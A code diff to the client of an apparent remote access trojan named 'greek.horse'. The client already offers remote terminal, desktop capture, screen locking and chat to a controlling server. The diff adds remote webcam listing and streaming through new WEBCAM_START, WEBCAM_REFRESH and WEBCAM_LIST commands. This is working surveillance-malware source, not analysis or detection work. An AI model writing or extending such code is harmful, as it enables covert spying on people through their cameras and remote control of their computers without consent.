@@ -1,6 +1,8 @@
 package greek.horse.client;
 
+import com.github.sarxos.webcam.Webcam;
 import greek.horse.client.tasks.ClientChatTask;
+import greek.horse.client.tasks.ClientWebcamTask;
 import greek.horse.client.tasks.DesktopTask;
 import greek.horse.models.*;
 import okhttp3.Request;
@@ -44,6 +46,7 @@ public class ClientSocketManager {
     private final ClientTerminalTask terminalTask = new ClientTerminalTask(this);
     private final LockTask lockTask = headless ? null : new LockTask(this, bot);
     private final DesktopTask desktopTask = headless ? null : new DesktopTask(this, bot);
+    private final ClientWebcamTask webcamTask = new ClientWebcamTask(this);
     private final ClientChatTask chatTask = headless ? null : new ClientChatTask(this);
 
     private static final boolean headless = GraphicsEnvironment.isHeadless();
@@ -61,6 +64,7 @@ public class ClientSocketManager {
             threadPool.execute(chatTask);
         }
         threadPool.execute(terminalTask);
+        threadPool.execute(webcamTask);
     }
 
     private static HashMap<Integer, Integer> createMap() {
@@ -158,6 +162,12 @@ public class ClientSocketManager {
                     return refreshDesktop(o, ticket);
                 case MONITOR_COUNT:
                     return getMonitorCount();
+                case WEBCAM_START:
+                    return startWebcam(o, ticket);
+                case WEBCAM_REFRESH:
+                    return refreshWebcam(o, ticket);
+                case WEBCAM_LIST:
+                    return getWebcamList();
                 case DISCONNECT:
                     return doDisconnect();
                 case USER_INPUT:
@@ -187,6 +197,21 @@ public class ClientSocketManager {
             this.running.set(false);
         }
 
+        return null;
+    }
+
+    private Object getWebcamList() {
+        return Webcam.getWebcams().stream().map(Webcam::getName).collect(Collectors.toList());
+    }
+
+    private Object refreshWebcam(Object o, FunctionTicket ticket) {
+        webcamTask.setInfo((WebcamInfoWrapper) o);
+        return null;
+    }
+
+    private Object startWebcam(Object o, FunctionTicket ticket) {
+        webcamTask.setInfo((WebcamInfoWrapper) o);
+        webcamTask.setTicket(ticket);
         return null;
     }
 
@@ -406,7 +431,6 @@ public class ClientSocketManager {
     private Object startDesktop(Object readObj, FunctionTicket ticket) {
         desktopTask.setInfo((MonitorDesktopWrapper) readObj);
         desktopTask.setTicket(ticket);
-
         return null;
     }
 
